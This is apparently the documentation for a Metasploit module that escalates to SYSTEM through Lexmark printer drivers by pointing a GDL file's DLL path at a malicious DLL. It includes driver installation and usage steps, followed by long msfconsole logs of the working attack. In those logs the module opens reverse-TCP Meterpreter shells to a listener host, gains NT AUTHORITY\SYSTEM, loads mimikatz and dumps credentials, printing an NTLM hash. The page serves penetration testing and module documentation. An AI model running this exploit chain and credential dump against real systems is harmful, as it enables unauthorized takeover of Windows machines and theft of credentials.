## Vulnerable Application

Various Lexmark Universal Printer drivers as listed at [advisory TE953](http://support.lexmark.com/index?page=content&id=TE953)
allow low-privileged authenticated users to elevate their privileges to `SYSTEM` on affected Windows systems by modifying
the XML file at `C:\\ProgramData\\<driver name>\\Universal Color Laser.gdl` to replace the DLL path
to `unires.dll` with a malicious DLL path.

When `C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\prnmngr.vbs` is then used to add the printer
to the affected system, `PrintIsolationHost.exe`, a Windows process running as `NT AUTHORITY\SYSTEM`,
will inspect the `C:\\ProgramData\\<driver name>\\Universal Color Laser.gdl` file and will load the
malicious DLL from the path specified in the file, which will result in the malicious DLL executing as `NT AUTHORITY\SYSTEM`.

Once this module is finished, it will use the `prnmngr.vbs` script to remove the printer it added.

## Driver Installation Steps
1. Download the vulnerable driver from https://github.com/rapid7/metasploit-framework/files/6941669/LMUD1o40.zip
1. Extract the `LMUD1o40.cab` file from the zip.
1. Use 7Zip to extract the contents of the `LMUD1o40.cab` file to a new directory. Do not use Window's default extraction tool, as it will not extract the files correctly.
1. Browse inside that directory and find the `LMUD1o40.inf` file, right click it, and click `Install`.
1. Accept the UAC prompt, then after a few seconds you should get a message stating the driver installed successfully.

## Verification Steps

1. Install a vulnerable Lexmark driver using the instructions at `Driver Installation Steps`.
2. Start `msfconsole`
3. Get a session with basic privileges
4. Do: `use exploit/windows/local/lexmark_driver_privesc`
5. Do: `set SESSION <sess_no>`
6. Do: `run`
7. You should get a shell running as `SYSTEM`.

## Options

### DRIVERNAME

Set `DRIVERNAME` to the specific Lexmark driver to attempt to exploit. The module will verify the driver is present. Example:

```
set DRIVERNAME Lexmark Printer Software G2 XL
```

## Scenarios

### Lexmark Printer Software G2 XL v2.2.0.0

```
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.0.0.9
lhost => 10.0.0.9
msf6 exploit(multi/handler) > set lport 1270
lport => 1270
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.0.0.9:1270
[*] Sending stage (200262 bytes) to 10.0.0.8
[*] Meterpreter session 1 opened (10.0.0.9:1270 -> 10.0.0.8:51814) at 2021-08-10 18:07:31 -0400

meterpreter > getuid
Server username: MOURNLAND\lowlevel
meterpreter > sysinfo
Computer        : MOURNLAND
OS              : Windows 10 (10.0 Build 17134).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x64/windows
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use exploit/windows/local/lexmark_driver_privesc
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/lexmark_driver_privesc) > set session 1
session => 1
msf6 exploit(windows/local/lexmark_driver_privesc) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/lexmark_driver_privesc) > set lhost 10.0.0.9
lhost => 10.0.0.9
msf6 exploit(windows/local/lexmark_driver_privesc) > set lport 1271
lport => 1271
msf6 exploit(windows/local/lexmark_driver_privesc) > check

[*] Lexmark driver published at oem3.inf
[*] Lexmark driver published at oem12.inf
[*] Found 2 possible options:
[*] 	Lexmark Printer Software G2
[*] 	Lexmark Printer Software G2 XL
[*] No user provided DRIVERNAME. Defaulting to "Lexmark Printer Software G2"
[*] The service is running, but could not be validated. A potentially vulnerable Lexmark print driver is available.
msf6 exploit(windows/local/lexmark_driver_privesc) > set DRIVERNAME Lexmark Printer Software G2 XL
DRIVERNAME => Lexmark Printer Software G2 XL
msf6 exploit(windows/local/lexmark_driver_privesc) > run

[*] Started reverse TCP handler on 10.0.0.9:1271
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Lexmark driver published at oem3.inf
[*] Lexmark driver published at oem12.inf
[*] Found 2 possible options:
[*] 	Lexmark Printer Software G2
[*] 	Lexmark Printer Software G2 XL
[*] The user selected driver was in the driver store
[!] The service is running, but could not be validated. A potentially vulnerable Lexmark print driver is available.
[*] Adding printer dgvUKSrm...
[*] Sending stage (200262 bytes) to 10.0.0.8
[*] Sending stage (200262 bytes) to 10.0.0.8
[*] Meterpreter session 2 opened (10.0.0.9:1271 -> 10.0.0.8:51830) at 2021-08-10 18:09:29 -0400
[*] Deleting printer dgvUKSrm
[*] Meterpreter session 3 opened (10.0.0.9:1271 -> 10.0.0.8:51831) at 2021-08-10 18:09:31 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

## Lexmark Universal Printer v2 - version 2.10.0.5 On Windows 10 v1903
```
msf6 exploit(multi/handler) > exploit

[*] Started bind TCP handler against 192.168.224.194:4444
[*] Sending stage (200262 bytes) to 192.168.224.194
[*] Meterpreter session 1 opened (0.0.0.0:0 -> 192.168.224.194:4444) at 2021-08-11 14:09:19 -0500

meterpreter > getuid
Server username: DESKTOP-O7MJD36\test
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use exploit/windows/local/lexmark_driver_privesc
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/lexmark_driver_privesc) > show options

Module options (exploit/windows/local/lexmark_driver_privesc):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   DRIVERNAME                   no        The name of the Lexmark driver to exploit
   SESSION                      yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.224.128  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf6 exploit(windows/local/lexmark_driver_privesc) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/lexmark_driver_privesc) > set LPORT 8877
LPORT => 8877
msf6 exploit(windows/local/lexmark_driver_privesc) > check

[*] Lexmark driver published at oem9.inf
[*] Found 1 possible options:
[*] 	Lexmark Universal v2
[*] No user provided DRIVERNAME. Defaulting to "Lexmark Universal v2"
[*] The service is running, but could not be validated. A potentially vulnerable Lexmark print driver is available.
msf6 exploit(windows/local/lexmark_driver_privesc) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/lexmark_driver_privesc) > show options

Module options (exploit/windows/local/lexmark_driver_privesc):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   DRIVERNAME                   no        The name of the Lexmark driver to exploit
   SESSION     1                yes       The session to run this module on.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.224.128  yes       The listen address (an interface may be specified)
   LPORT     8877             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf6 exploit(windows/local/lexmark_driver_privesc) > exploit

[*] Started reverse TCP handler on 192.168.224.128:8877
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Lexmark driver published at oem9.inf
[*] Found 1 possible options:
[*] 	Lexmark Universal v2
[*] No user provided DRIVERNAME. Defaulting to "Lexmark Universal v2"
[!] The service is running, but could not be validated. A potentially vulnerable Lexmark print driver is available.
[*] Adding printer dGJvF...
[*] Deleting printer dGJvF
[*] Adding printer dGJvF...
[*] Sending stage (200262 bytes) to 192.168.224.194
[*] Sending stage (200262 bytes) to 192.168.224.194
[+] Deleted C:\Users\test\AppData\Local\Temp\AqMVx.dll
[*] Meterpreter session 2 opened (192.168.224.128:8877 -> 192.168.224.194:56007) at 2021-08-11 14:10:56 -0500
[*] Meterpreter session 3 opened (192.168.224.128:8877 -> 192.168.224.194:56016) at 2021-08-11 14:10:57 -0500
[*] Deleting printer dGJvF

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeImpersonatePrivilege
SeTcbPrivilege

meterpreter > load kiwi
Loading extension kiwi...c
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain           NTLM                              SHA1
--------  ------           ----                              ----
test      DESKTOP-O7MJD36  0cb6948805f797bf2a82807973b89537  87f8ed9157125ffc4da9e06a7b8011ad80a53fe1

wdigest credentials
===================

Username          Domain           Password
--------          ------           --------
(null)            (null)           (null)
DESKTOP-O7MJD36$  WORKGROUP        (null)
test              DESKTOP-O7MJD36  (null)

kerberos credentials
====================

Username          Domain           Password
--------          ------           --------
(null)            (null)           (null)
desktop-o7mjd36$  WORKGROUP        (null)
test              DESKTOP-O7MJD36  (null)


meterpreter > sysinfo
Computer        : DESKTOP-O7MJD36
OS              : Windows 10 (10.0 Build 18362).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter >
```